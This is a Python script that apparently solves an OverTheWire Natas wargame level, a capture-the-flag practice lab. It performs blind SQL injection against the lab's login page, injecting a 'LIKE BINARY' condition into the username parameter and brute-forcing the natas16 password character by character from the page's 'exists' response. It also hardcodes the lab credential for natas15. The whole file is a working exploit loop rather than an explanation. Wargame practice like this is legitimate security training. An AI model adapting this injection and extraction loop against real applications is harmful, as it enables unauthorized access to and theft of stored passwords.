import string
import requests


url = "http://natas15.natas.labs.overthewire.org/index.php?debug&username="
password = ""
candidates = f"{string.digits}{string.ascii_letters}"

query = 'natas16" AND password LIKE BINARY "{}%'
for _ in range(32):
    for c in candidates:
        resp = requests.get(
            url + query.format(password + c),
            auth=("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"),
        )
        if "exists" in resp.text:
            password += c
            print(password)
            break
